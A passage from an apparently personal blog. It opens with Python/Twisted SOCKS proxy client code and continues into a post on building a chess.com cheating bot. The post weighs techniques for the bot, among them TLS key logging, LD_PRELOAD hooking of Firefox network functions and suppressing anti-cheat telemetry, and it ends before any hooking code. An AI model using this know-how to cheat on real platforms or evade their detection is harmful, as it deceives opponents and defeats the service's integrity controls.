        <span class="bp">self</span><span class="o">.</span><span class="n">_reactor</span> <span class="o">=</span> <span class="n">reactor</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_endpoint</span> <span class="o">=</span> <span class="n">endpoint</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_timestamps</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="k">if</span> <span class="n">timestamps</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_timestamps</span> <span class="o">=</span> <span class="n">timestamps</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span> <span class="o">=</span> <span class="n">IReactorTime</span><span class="p">(</span><span class="n">reactor</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">noteTime</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_timestamps</span><span class="p">[</span><span class="n">event</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span><span class="o">.</span><span class="n">seconds</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">protocolFactory</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        Return a deferred firing when the SOCKS connection is established.</span>
<span class="sd">        &quot;&quot;&quot;</span>

        <span class="k">def</span> <span class="nf">createWrappingFactory</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
            <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">            Wrap creation of _WrappingFactory since __init__() doesn&#39;t</span>
<span class="sd">            take a canceller as of Twisted 12.1 or something.</span>
<span class="sd">            &quot;&quot;&quot;</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">inspect</span><span class="o">.</span><span class="n">getargspec</span><span class="p">(</span><span class="n">_WrappingFactory</span><span class="o">.</span><span class="n">__init__</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="k">def</span> <span class="nf">_canceller</span><span class="p">(</span><span class="n">deferred</span><span class="p">):</span>
                    <span class="n">connector</span><span class="o">.</span><span class="n">stopConnecting</span><span class="p">()</span>
                    <span class="n">deferred</span><span class="o">.</span><span class="n">errback</span><span class="p">(</span>
                        <span class="n">error</span><span class="o">.</span><span class="n">ConnectingCancelledError</span><span class="p">(</span>
                            <span class="n">connector</span><span class="o">.</span><span class="n">getDestination</span><span class="p">()))</span>
                <span class="k">return</span> <span class="n">_WrappingFactory</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">_canceller</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>                           <span class="c"># Twisted &gt;= 12.1.</span>
                <span class="k">return</span> <span class="n">_WrappingFactory</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;START&#39;</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c"># Connect with an intermediate SOCKS factory/protocol,</span>
            <span class="c"># which then hands control to the provided protocolFactory</span>
            <span class="c"># once a SOCKS connection has been established.</span>
            <span class="n">f</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">factory</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_proxy_config</span><span class="p">)</span>

            <span class="n">f</span><span class="o">.</span><span class="n">postHandshakeEndpoint</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_endpoint</span>
            <span class="n">f</span><span class="o">.</span><span class="n">postHandshakeFactory</span> <span class="o">=</span> <span class="n">protocolFactory</span>
            <span class="n">f</span><span class="o">.</span><span class="n">handshakeDone</span> <span class="o">=</span> <span class="n">defer</span><span class="o">.</span><span class="n">Deferred</span><span class="p">()</span>
            <span class="n">f</span><span class="o">.</span><span class="n">_timestamps</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timestamps</span>
            <span class="n">f</span><span class="o">.</span><span class="n">_timer</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span>
            <span class="n">wf</span> <span class="o">=</span> <span class="n">createWrappingFactory</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_reactor</span><span class="o">.</span><span class="n">connectTCP</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">_port</span><span class="p">,</span> <span class="n">wf</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;SOCKET&#39;</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">handshakeDone</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">defer</span><span class="o">.</span><span class="n">fail</span><span class="p">()</span>
</pre></div>


<p>You can use the module for HTTP connection endpoints somehow like that</p>
<div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>

<span class="c"># Copyright (c) 2011-2013, The Tor Project</span>
<span class="c"># See LICENSE for the license.</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">urlparse</span> <span class="kn">import</span> <span class="n">urlparse</span>
<span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">endpoints</span>
<span class="kn">from</span> <span class="nn">socksclient</span> <span class="kn">import</span> <span class="n">SOCKSv4ClientProtocol</span><span class="p">,</span> <span class="n">SOCKSWrapper</span>
<span class="kn">from</span> <span class="nn">twisted.web</span> <span class="kn">import</span> <span class="n">client</span>

<span class="k">class</span> <span class="nc">TestClass</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">npages</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">timestamps</span> <span class="o">=</span> <span class="p">{}</span>

    <span class="k">def</span> <span class="nf">wrappercb</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">):</span>
        <span class="k">print</span> <span class="s">&quot;connected to proxy&quot;</span><span class="p">,</span> <span class="n">proxy</span>

    <span class="k">def</span> <span class="nf">clientcb</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="k">print</span> <span class="s">&quot;ok, got: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">content</span><span class="p">[:</span><span class="mi">120</span><span class="p">]</span>
        <span class="k">print</span> <span class="s">&quot;timetamps &quot;</span> <span class="o">+</span> <span class="nb">repr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamps</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">npages</span> <span class="o">-=</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">npages</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">reactor</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">sockswrapper</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy_config</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
        <span class="n">dest</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">assert</span> <span class="n">dest</span><span class="o">.</span><span class="n">port</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">,</span> <span class="s">&#39;Must specify port number.&#39;</span>
        <span class="n">endpoint</span> <span class="o">=</span> <span class="n">endpoints</span><span class="o">.</span><span class="n">TCP4ClientEndpoint</span><span class="p">(</span><span class="n">reactor</span><span class="p">,</span> <span class="n">dest</span><span class="o">.</span><span class="n">hostname</span><span class="p">,</span> <span class="n">dest</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">SOCKSWrapper</span><span class="p">(</span><span class="n">reactor</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">,</span> <span class="n">proxy_config</span><span class="p">,</span> <span class="n">timestamps</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamps</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">thing</span> <span class="o">=</span> <span class="n">TestClass</span><span class="p">()</span>

    <span class="c"># Mandatory first argument is a URL to fetch over Tor (or whatever</span>
    <span class="c"># SOCKS proxy that is running on localhost:9050).</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">proxy_config</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">&#39;host&#39;</span><span class="p">:</span> <span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span>
        <span class="s">&#39;port&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">,</span>
        <span class="s">&#39;version&#39;</span><span class="p">:</span> <span class="s">&#39;4&#39;</span><span class="p">,</span>
        <span class="s">&#39;version_specific&#39;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s">&#39;rdns&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span> <span class="c"># Enforce resolving hostnames remotely (Only supported by version 4a and 5)</span>
            <span class="s">&#39;cmd&#39;</span><span class="p">:</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x01</span><span class="s">&#39;</span><span class="p">,</span> <span class="c"># this may be CONNECT, BIND and UDP in version 5. In 4 and 4a, it&#39;s always CONNECT or BIND</span>
            <span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;socksuser&#39;</span><span class="p">,</span> <span class="c"># Enables simple username/password authentication mechanism in version 5</span>
            <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">proxy_config2</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">&#39;host&#39;</span><span class="p">:</span> <span class="s">&#39;212.224.92.182&#39;</span><span class="p">,</span>
        <span class="s">&#39;port&#39;</span><span class="p">:</span> <span class="mi">7777</span><span class="p">,</span>
        <span class="s">&#39;version&#39;</span><span class="p">:</span> <span class="s">&#39;5&#39;</span><span class="p">,</span>
        <span class="s">&#39;version_specific&#39;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s">&#39;rdns&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span> <span class="c"># Enforce resolving hostnames remotely (Only supported by version 4a and 5)</span>
            <span class="s">&#39;cmd&#39;</span><span class="p">:</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x01</span><span class="s">&#39;</span><span class="p">,</span> <span class="c"># this may be CONNECT, BIND and UDP in version 5. In 4 and 4a, it&#39;s always CONNECT or BIND</span>
            <span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;someuser&#39;</span><span class="p">,</span> <span class="c"># Enables simple username/password authentication mechanism in version 5</span>
            <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&#39;somepass&#39;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c"># From http://fastproxyservers.org/socks5-servers.htm</span>
    <span class="n">proxy_config3</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">&#39;host&#39;</span><span class="p">:</span> <span class="s">&#39;202.84.44.129&#39;</span><span class="p">,</span>
        <span class="s">&#39;port&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">,</span>
        <span class="s">&#39;version&#39;</span><span class="p">:</span> <span class="s">&#39;4&#39;</span><span class="p">,</span>
        <span class="s">&#39;version_specific&#39;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s">&#39;rdns&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span> <span class="c"># Enforce resolving hostnames remotely (Only supported by version 4a and 5)</span>
            <span class="s">&#39;cmd&#39;</span><span class="p">:</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x01</span><span class="s">&#39;</span><span class="p">,</span> <span class="c"># this may be CONNECT, BIND and UDP in version 5. In 4 and 4a, it&#39;s always CONNECT or BIND</span>
            <span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="c"># Enables simple username/password authentication mechanism in version 5</span>
            <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">f</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">HTTPClientFactory</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">deferred</span><span class="o">.</span><span class="n">addCallback</span><span class="p">(</span><span class="n">thing</span><span class="o">.</span><span class="n">clientcb</span><span class="p">)</span>

    <span class="n">sw</span> <span class="o">=</span> <span class="n">thing</span><span class="o">.</span><span class="n">sockswrapper</span><span class="p">(</span><span class="n">proxy_config2</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">sw</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="n">d</span><span class="o">.</span><span class="n">addCallback</span><span class="p">(</span><span class="n">thing</span><span class="o">.</span><span class="n">wrappercb</span><span class="p">)</span>
    <span class="n">thing</span><span class="o">.</span><span class="n">npages</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="n">reactor</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>

<span class="k">if</span> <span class="s">&#39;__main__&#39;</span> <span class="o">==</span> <span class="n">__name__</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/the-art-of-cheating-making-a-chess-com-chess-bot-using-a-unusual-approach.html#the-art-of-cheating-making-a-chess-com-chess-bot-using-a-unusual-approach">The art of cheating: Making a chess.com chess bot following an unusual approach!</a></h2>
    <p>
      Posted on So 26 Januar 2014 in <a href="/category/c.html">C</a>
      &#8226; Tagged with
      <a href="/tag/c.html">C</a>,      <a href="/tag/chesscom.html">Chess.com</a>,      <a href="/tag/cheating.html">Cheating</a>,      <a href="/tag/firefox.html">Firefox</a>,      <a href="/tag/hooking.html">Hooking</a>,      <a href="/tag/chess.html">Chess</a>,      <a href="/tag/lowlevel.html">Lowlevel</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/security.html">Security</a>    </p>
  </header>
  <div>
      <h3>Table of contents</h3>
<ol>
<li><strong><a href="#chap_preface">Preface</a></strong>: Giving first insight into the idea and
    why I think that hooking into a browser is a good idea.</li>
<li><strong><a href="#chap_dwmbgb">Many different ways to make browser game bots</a></strong>:
    Discussion various techniques to write HTTP/WebSocket bots</li>
<li><strong><a href="#chap_internals">How does chess.com internally look like?</a></strong>:
    Investigation of the client side behavior of
    <a href="http://chess.com">chess.com</a></li>
<li><strong><a href="#chap_workings">How the bot works</a></strong>: Explaining how my shared
    library hooks firefox network functions</li>
<li><strong><a href="#chap_concl">Conclusion</a></strong>: Summary of my discoveries</li>
<li><strong><a href="https://vimeo.com/85060026" title="Link to the demonstration of the bot">Demo
    Video</a>
    and another, <a href="https://vimeo.com/85083958" title="demo video, better">better demo
    video</a></strong>: You might
    only watch that video, but make sure you <a href="#chap_demo">read the explanation on
    the very bottom of this blog post!</a></li>
<li>You may find the sources to the shared library (so) on my <a href="https://github.com/NikolaiT/chess-com-cheat/" title="Link to chess.com cheat library">github
    account</a>.</li>
</ol>
<h3 id="chap_preface">Preface</h3>
<p>Usually I don't have good ideas in forms of flashes of genius. On the
contrary, I think that many endeavors and interesting projects might be
reasonable if realized, but often so, there's a huge amount of work
involved and <em>too</em> many variables and strategic decisions in the process
that could eventually render the project a failure. What I try to say: A
mediocre idea well engineered might be a good product. But a good idea
badly implemented and designed is usually just bad in it's final form.</p>
<p>Raw, abstract ideas exist in abundance. So does the will to make them
happen. But once in a while, I manage to overcome these two hindrances
and begin to build and shape my ideas into reality.</p>
<p>So around 10 days ago (yes it took me that long to make it) I went
jogging in the forest and my subconscious searched for different
possibilities to cheat in a chess browser game
(<a href="http://chess.com" title="chess server">chess.com</a> to be specific). I knew
that there were quite some different approaches. So before I get all to
technical, let's define the obstacle:</p>
<p>I want build a bot that plays automatic actions/moves on a online chess
server, whose communication is realized over HTTP 1/1 and
<a href="http://tools.ietf.org/html/rfc6455">WebSocket</a> (https and wws
respectively), all TLS/SSL encrypted.</p>
<p>Additionally the following constraints need to be considered:</p>
<ul>
<li>The bot should work <em>while the player is actually playing</em>. That
    means: Without any real action by a human, the bot won't do anything
    at all.</li>
<li>The engine that computes the moves is a local process. I chose
    <a href="http://stockfishchess.org/">Stockfish</a>: it has a pretty decent
    strength and is open source which makes it usable on Linux contrary
    to Houdini. If we want to use engine calculated information in the
    browser we need to get a channel to a local process. We can't
    integrate Stockfish originated data into the browser process space
    with memory injection methods, since it seems hard and I don't know
    how to do it (correctly). But we surely may interact with the local
    process in any other possible IPC way.</li>
</ul>
<p>So this was my idea that overcame me in the woods while running: Why
should I even bother rebuilding the whole chess.com communication
protocol, when I can just <em>replace the moves I made ingame with engine
calculated equivalents?!</em></p>
<p>Every move (like <em>a2a3</em> or <em>g7g8</em>) has identical lengths, so I need to
find the point where the packets (or messages in WebSockets RFC
terminology) are still decrypted (note that all traffic is TLS/SSL
layered) such that it's possible to update them, without dealing with
the hassle of TLS/SSL.</p>
<p>And there is only one place where I can do this: Inside of the browser
process space, in some networking function that sends and receives the
target packets. This was my idea. I knew that it must be possible to
find this <em>hook point</em> and to alter the packets somewhere.</p>
<p>But hell, I didn't knew that this approach was that hard to achieve!</p>
<p>So before I'll dive into the technical internals, I'll discuss the
different possible architectures and designs of cheating <em>in particular</em>
for a chess.com bot, but which are also perfectly applicable <em>to general
browser game automation</em>.</p>
<h3 id="chap_dwmbgb">Many different ways to make browser game bots!</h3>
<ol>
<li><strong>A high level approach</strong> would be to inject custom javascript into
    the DOM of a running browser session.<br />
    This piece of javascript then connects to a local server (e.g. to a
    simple server listening on localhost:SOMEPORT) that responses with a
    bot calculated move when requesting with the current game action
    history. A pretty nice example of this technique is <a href="http://www.youtube.com/watch?v=PW1vMXHJdnM" title="high level javascript bot">this video on
    youtube</a>
    (I suppose it uses this design paradigm, but I don't know because
    there are no open sources to investigate further).<br />
<em>Advantages</em>: Comparably easy implementation, because we don't need
    to tinker with packets and can directly attack the game logic. Works
    for all platforms and all browsers, because javascript is
    universally runnable.<br />
<em>Drawbacks:</em> Maybe we can't build a connection to localhost due to
    the same-origin policy (Can we?) This would render this approach
    impossible, since we absolutely need a way to communicate with the
    local program that supplies us with engine moves. Then maybe a
    socket connection (although listening on localhost) might be slower
    than other
    <a href="http://en.wikipedia.org/wiki/Inter-process_communication" title="inter process communication techniques">IPC</a>
    techniques, because of the TCP/IP stack overhead.</li>
<li><strong>Another high level technique</strong> would be to write a custom browser
    extension that intercepts the browser game traffic and injects bot
    calculated moves.<br />
<em>Advantages</em>: We don't need to hassle with SSL/TLS decryption
    because our application is executed in the browser process.
    Furthermore it must be somehow possible to communicate with a local
    process that supplies the extension with engine knowledge.<br />
<em>Disadvantages</em>: Platform and browser dependent code. When going
    down that road, I would need to write platform independent C code
    for different browsers. Additionally, it's questionable if we can
    speak to different processes, because of the browser sandboxes and
    their security policies.</li>
<li><strong>Another approach: Low level network stack interception
    technique:</strong> I could sniff on the network interface where the TCP
    packets of the communication sessions are exchanged with a
    appropriate API like
    <a href="http://www.secdev.org/projects/scapy/" title="awesome python security module">scapy</a>
    or <a href="http://www.tcpdump.org/" title="the library behind tcpdump">libpcap</a>
    (When writing C directly). Because the communication is encrypted
    with SSL/TLS, there needs to be a reliable way to decrpyt the TCP
    packets. This is not a trivial task, since different browsers use
    different ciphers/HMACS for TSL/SSL (they are determined in the
    <a href="http://en.wikipedia.org/wiki/Transport_Layer_Security#TLS_handshake" title="SSL handshake protocol">handshake</a>).<br />
    This issue however is alleviated by the fact that some browsers can
    be started with a option (environment variable
    <a href="https://developer.mozilla.org/en-US/docs/NSS_Key_Log_Format">SSLKEYLOGFILE</a>)
    to dump the current key secrets of a SSL/TLS session to a file which
    my bot could use to decrypt/encrypt the traffic on the fly.<br />
    Once decrypted, I would modify the appropriate move values and
    replace the action I made, with the bot calculated move. Then I need
    to encrypt the packet again with the cipher specified in the
    SSLKEYLOGFILE. But this implies several issues as for example:<br />
    How can my sniffer/bot know which cipher was used? He only knows
    the current keys for the session, but not the ciphers. In the worst
    case, we need to also sniff the SSL/TLS handshake and connection
    start. This again is a very tedious process since the many quirks
    and combinations of a TLS session beginning.<br />
    Padding shouldn't be a bigger issue because the moves in the packet
    are just replaced and no additional data is injected or deleted. So
    the TCP packets should stay the same. We only need to recalculate
    the checksums.</li>
<li>Another <em>thoroughly</em> low level approach: <strong>Hooking <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">.so
    libraries</a>!</strong>
    This was my idea while running in the forest!<br />
    This might be the hardest approach in the investigation and
    research phase (It's not a easy task to find the correct hooking
    points in the HUGE chromium or firefox code base, but it looks like
    the <a href="https://developer.mozilla.org/en-US/docs/NSS">NSS library</a> is a
    good starting point), but also the most elegant way, because we
    don't need to hassle with SSL/TLS quirks and can work with plaintext
    HTTP requestes/responses, when we find a good hook point. This
    approach, although very elegant and straightforward comes with huge
    drawbacks:<br />
    Hooking is very platform depended. On linux we could hook with
    kernel modules or the <a href="http://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">LD_PRELOAD
    trick</a>.
    On Windows we'd need other hooking techniques like IAT hooking,
    using the microsoft hooking library or something else. Additionally,
    we need to know the target architecutre (Differences between x86 and
    amd64). But from what I know now, this approach seems to be the best
    compared to the others, because we can work in the target process
    space (The browser userland process space itself) and we do not
    reassemble/decrypt packets ourselves (like in the previous
    technique). <strong>Form grabbers are a related technique</strong> used by
    blackhats for their trojans.</li>
<li>
<p><strong>The traditional way</strong>: Re-implement the high level browser game
    protocol by forging messages and HTTP Requests. This is not very
    elegant because our goal is to just modify packets. But when
    following this approach, we'd need to rebuilt the whole game logic
    (or at least many parts). This'd look something like the following:</p>
<div class="highlight"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">login</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;https://browsergame.com&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;login&#39;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="k">pass</span><span class="p">})</span>
<span class="k">if</span> <span class="n">login</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">success</span><span class="p">():</span>
    <span class="n">requeset</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;https://browsergame.com/action.php?gamelogic=blabla&#39;</span><span class="p">)</span>
    <span class="c"># Do implement game logic</span>
</pre></div>


</li>
<li>
<p><strong>The easy way:</strong> Make a click bot! Just control the mouse
    programmatically and initiate actions like a human would.<br />
    Normally such bots learn where the chess board in the browser
    window is located in the browser window by comparing the pixel
    colors of the screen with the color of the chess squares (or
    whatever field you want to locate). Slightly more adanced would be
    to locate the html elements that represent the squares and
    recalculate the exact location based on viewport sizes and settings
    and rendering. But I don't know how it is actually made, do you have
    a idea?<br />
    Anyways, the huge majority of chess.com bots is of this
    architecture type. You can view them in action
    <a href="http://www.youtube.com/watch?v=1SwOskkPnS0">here</a> or
    <a href="http://www.youtube.com/watch?v=5osrRuz4tvM" title="high level chess.com bot">here</a>
    on youtube.<br />
<em>Advantages</em>: Very easy to implement, very powerful technique, very
    good possibilities to evade anti cheating techniques (For instance,
    if <em>there were</em> cheating detection <em>besides</em> the ones who detect and
    doom very strong play as engine originated, these approaches would
    try to find out whether the current player is human by interpreting
    mouse movements and intervals between moves. But somewhere this
    information has to be gathered and sent to a server. We could just
    remove this submittal and therefore the server has no way to learn
    that we are cheaters).</p>
</li>
</ol>
<h3 id="chap_internals">How does chess.com internals look like?</h3>
<p>Having discussed the different architectures for a bot (Remember: I
chose the hooking technique!) it was time to learn more about the
target.</p>
<p>My plan was very ambitions, because I had very little experience with
hooking processes and hell, I didn't code in C or assembly for over 1.5
years, nor did I have much experience in the past. Muppets! Even now, I
know nothing about low level stuff at all.</p>
<p>So it was definitely time <strong>to get my learning hat on</strong> and to
investigate how <a href="http://chess.com">chess.com</a> works.</p>
<p>I based a lot of my investigations on the <a href="https://code.google.com/p/v8/">V8
debugger</a>, the one integrated in the
Chrome browser dev tools. I am not much of a Google fan, but Jesus
fucking Christ, Chrome's Development tools (the stuff that pops up when
you click on <em>Inspect Element</em> in the context menu) is just a very well
crafted tool!</p>
<p>It's very fast, newer hangs or remarkably loads and there are so many
features whilst maintaining a very clear and concise interface. If you
don't know how to use it, I really suggest reading and spending a hour
on this tutorial (Do the assignments, otherwise what you learned won't
stick): <a href="https://developers.google.com/chrome-developer-tools/docs/javascript-debugging">DevTools javascript debugger
tutorial</a>.</p>
<p>So by using this debugger I found out that chess.com inner client side
machinery essentially consists of around 30k lines of javascript code.
There are three major files, LiveChessAdvanced.js, LiveChessBase.js,
LiveChessCore.js, you can see a excerpt in the screenshot below:</p>
<p>[caption id="attachment_654" align="alignleft" width="640"]<a href="/uploads/2014/01/Screenshot-from-2014-01-26-055418.png"><img alt="Look into
the chess.com internals with the Chrome debugging
tools" src="/uploads/2014/01/Screenshot-from-2014-01-26-055418-1024x515.png" /></a>
<em>Look into the chess.com internals with the Chrome debugging
tools</em>[/caption]</p>
<p>Furthermore all of chess.com's networking is handled by a file called
cometd.js, so chess.com makes use of the <em>Bayeux protocol</em>. You can
learn more about the javascript library on
<a href="http://cometd.org/">cometd.org</a>.</p>
<p>But why such a strange protocol?</p>
<p>HTTP 1.1 is a request response protocol, it's not suited to implement
complex game protocols.</p>
<p>This was quite a issue in the last years, because companies wanted to
bring complex applications (like browser games) to the browser and so
they implemented a range of techniques that circumvented these obstacles
by exploiting some HTTP quirks, like the fact that HTTP connections stay
open under specific circumstances, like loading javascript in chunks (A
form of long polling, it's basically just creating <em>script</em> elements in
excess and pointing their <em>src</em> attribute to the cometd server which
then sends back JavaScript (or JSONP) with events as its payload). Or
you can achieve alternatively the same with frames. All these techniques
are summarized under the umbrella term cometd, and <a href="http://en.wikipedia.org/wiki/Comet_(programming)">you should read
about them on
wikipedia</a>.</p>
<p>But in late 2011 the <a href="http://tools.ietf.org/html/rfc6455" title="RFC for WebSocket">WebSocket
standard</a> was
established in it's final form and nowadays we don't need to make use of
cometd techniques (At least I assume that WebSocket should replace these
techniques), because we can make bi-directional, full-duplex
(simultaneous communication in both directions) TCP like connections
using WebSockets. And this is exactly what chess.com does, it
exclusively uses WebSockets for their protocol, when the connection is
good enough.</p>
<p>But now comes the first quirk: I strongly assume that this cometd.js
library provides fallbacks for the case they detect that WebSockets
aren't working for some reason. This happend to me quite often:</p>
<p>My internet connection here is very messy and I have a speed limit of
around 60kps downstream and around 10kps upstream. I don't know if this
could be a reason, that <a href="https://github.com/cometd/cometd" title="cometd on github">the
library</a> sometimes
changes protocols, but it certainly does. I first realized this, when I
was able to intercept the game traffic using the HttpHeaders firefox
plugin (that, like the name suggests, only captures HTTP traffic) and
then suddenly in the next game the captured traffic was empty. So I
concluded that the protocol responsible for the game traffic must be
chosen dynamically, for which the connection stability seems to be a
variable!</p>
<p>So enough written, <strong>show me some protocol examples of chess.com</strong> you
shout! Here you go:</p>
<p>This is a typical WebSocket JSON message from the server that updates
the game state of a game (This packet belongs to a game that I was
received while kibitzing, not one I played myself):</p>
